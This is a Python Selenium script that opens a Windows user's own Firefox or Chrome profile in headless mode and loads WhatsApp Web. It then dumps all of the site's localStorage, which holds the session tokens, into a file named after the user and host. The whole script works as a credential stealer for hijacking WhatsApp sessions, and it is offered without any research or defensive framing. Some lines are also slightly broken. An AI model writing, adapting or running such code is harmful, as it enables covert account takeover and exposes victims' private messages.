from selenium import webdriver
import selenium.common.exceptions as webexcept
from selenium.webdriver.firefox.options import Options
import os
import socket
import getpass
import platform

pc = socket.gethostname()
name = getpass.getuser()


def get(key=None):
    # noinspection PyGlobalUndefined
    global driver
    if key:
        return driver.execute_script("return window.localStorage.getItem('{}')".format(key))
    else:
        return driver.execute_script("""
        var items = {}, ls = window.localStorage;
        for (var i = 0, k; i < ls.length; i++)
          items[k = ls.key(i)] = ls.getItem(k);
        return items;
        """)


if platform.system() == "Windows":
    noChrome = False
    noFirefox = False
    fireoptions = Options()
    fireoptions.set_preference
    fireoptions.set_headless(headless=True)
    chromeoptions = webdriver.ChromeOptions()
    chromeoptions.set_headless(headless=True)
    try:
        driver = webdriver.Firefox(options=fireoptions)
        driver.quit()
    except webexcept.WebDriverException:
        noFirefox = True
    try:
        driver = webdriver.Chrome(options=chromeoptions)
        driver.quit()
    except webexcept.WebDriverException:
        noChrome = True

if not noFirefox:
    options = Options()
    options.set_preference
    options.set_headless(headless=True)
    windir = os.listdir(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles')
    fireprofile = webdriver.FirefoxProfile(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles' + '\\' + windir[0])
    driver = webdriver.Firefox(fireprofile, options=options)
    driver.get('https://web.whatsapp.com/')
    for key, value in get().items():
        with open("saves\\" + ("%s@%s.lwa" % (str(name), str(pc))), "ab") as me:
            try:
                me.write(key + ': ' + value + '\n')
            except UnicodeEncodeError:
                pass
    driver.quit()

if not noChrome:
    windir = os.environ['USERPROFILE'] + '\Appdata\Local\Google\Chrome\User Data'
    options = webdriver.ChromeOptions()
    options.add_argument('user-data-dir=%s' % windir)
    options.set_headless(headless=True)
    driver = webdriver.Chrome(chrome_options=options)
    driver.get('https://web.whatsapp.com/')
    for key, value in get().items():
        with open("saves\\" + ("%s@%s.lwa" % (str(name), str(pc))), "ab") as me:
            try:
                me.write(key + ': ' + value + '\n')
            except UnicodeEncodeError:
                pass
    driver.quit()
